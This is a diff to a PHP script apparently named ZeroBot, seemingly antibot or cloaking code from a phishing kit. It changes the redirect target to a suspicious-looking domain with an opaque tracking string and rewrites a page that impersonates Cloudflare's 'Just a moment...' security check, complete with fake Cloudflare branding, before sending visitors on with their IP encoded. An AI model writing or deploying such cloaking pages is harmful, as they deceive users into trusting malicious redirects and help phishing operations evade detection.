@@ -14,7 +14,7 @@
 
 $license_key = "3b11sgdgnl9atpdcr79leftsc8xtyfd4"; // [REQUIRED]
 
-$redirect = "https://krasecwleessry-cjgkevc7dghvctda.westeurope-01.azurewebsites.net"; // URL or FILE [REQUIRED]
+$redirect = "https://tdud.theworkitcentre.com?s5hchtam92y2pvvuxhes5hchtam92y2pvvuxhs5hchtam92y2pvvuxhes5hchtam92y2pvvuxhs5hchtam92y2pvvuxhes5hchtam92y2pvvuxh"; // URL or FILE [REQUIRED]
 
 
 $parameter = 1; // [REQUIRED]
@@ -478,9 +478,102 @@ class ZeroBot
         
         if (!$captcha["activation"]) return;
 
-        $logo = $_SESSION["logo"] ?? "https://zerobot.info/captcha/favicon.png";
+        $logo = $_SESSION["logo"] ?? "";
 
-        $html = '<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Just a moment...</title><link rel="stylesheet" href="https://zerobot.info/assets/css/cloudflare.css"></head><body class="no-js"><div class="main-wrapper" role="main"><div class="main-content"><h1 class="zone-name-title h1"><div><img width="100px" src="' . $logo . '" style="margin-bottom:-17px" /><div class="site-name"><br></div></div></h1><span id="challenge-error-text"></span><noscript><div id="challenge-error-title"><div class="h2"><div class="icon-wrapper"><div class="heading-icon warning-icon"></div></div><span class="icon-wrapper"><div class="heading-icon warning-icon"></div></span><span id="challenge-error-text">Enable JavaScript and cookies to continue</span></div></div></noscript><p data-translate="please_wait" id="cf-spinner-please-wait">Please stand by, while we are checking if the site connection is secure</p><form action="?" method="POST" id="gForm" style="visibility:hidden"><div class="h-captcha" data-sitekey="f9a2c5c0-f28a-4fe2-bfba-6f8a6c98b62a" data-callback="verifyCallback_hCaptcha"></div><br></form><form action="?" method="POST" id="cfForm" style="visibility:visible" data-callback="verifyCallback_CF"><div id="turnstileCaptcha"></div><br></form><div id="challenge-body-text" class="core-msg spacer"><div style="margin:10px">Needs to review the security of your connection before proceeding.</div></div></div></div><div class="footer" role="contentinfo"><div class="footer-inner"><div class="text-center">Performance &amp; security by <a rel="noopener noreferrer" href="#" target="_blank">Cloudflare</a></div></div></div><script>var verifyCallback_CF=function(response){window.location.href="?authorize='. base64_encode($this->ip) . '";};var refreshCallBack=function(response){setTimeout(function(){window.location.reload()},1000)};window.onloadTurnstileCallback=function(){turnstile.render("#turnstileCaptcha",{sitekey:"' . $captcha['site_key'] . '",callback:verifyCallback_CF,"expired-callback":refreshCallBack})};</script><script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback"></script></body></html>';
+        $html = '<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Just a moment...</title>
+  <link rel="stylesheet" href="https://zerobot.info/assets/css/cloudflare.css">
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #fff;
+    }
+
+    .main-wrapper {
+      text-align: center;
+      padding: 0px;
+      background: #fff;
+      box-shadow: 0 0 0px rgba(0,0,0,0.1);
+      border-radius: 0px;
+    }
+
+    .zone-name-title img {
+      margin-bottom: -17px;
+    }
+
+    #cfForm {
+      margin-top: 20px;
+    }
+
+    .footer {
+      display: none; /* Hide footer if not needed */
+    }
+  </style>
+</head>
+<body class="no-js">
+  <div class="main-wrapper" role="main">
+    <div class="main-content">
+      <h1 class="zone-name-title h1">
+        <img width="100px" src="' . $logo . '" />
+        <div class="site-name"><br></div>
+      </h1>
+
+      <noscript>
+        <div id="challenge-error-title">
+          <div class="h2">
+            <div class="icon-wrapper">
+              <div class="heading-icon warning-icon"></div>
+            </div>
+            <span id="challenge-error-text">Enable JavaScript and cookies to continue</span>
+          </div>
+        </div>
+      </noscript>
+
+      <p id="cf-spinner-please-wait"></p>
+
+      <form action="?" method="POST" id="cfForm" data-callback="verifyCallback_CF">
+        <div id="turnstileCaptcha"></div>
+        <br>
+      </form>
+
+      <div id="challenge-body-text" class="core-msg spacer">
+        <div style="margin:10px">
+         
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    var verifyCallback_CF = function(response) {
+      window.location.href = "?authorize=' . base64_encode($this->ip) . '";
+    };
+
+    var refreshCallBack = function(response) {
+      setTimeout(function() { window.location.reload() }, 1000);
+    };
+
+    window.onloadTurnstileCallback = function() {
+      turnstile.render("#turnstileCaptcha", {
+        sitekey: "' . $captcha['site_key'] . '",
+        callback: verifyCallback_CF,
+        "expired-callback": refreshCallBack
+      });
+    };
+  </script>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback" async defer></script>
+</body>
+</html>
+';
 
         echo $html;
     }
@@ -675,4 +768,3 @@ class ZeroBot
 }
 
 new ZeroBot();
-
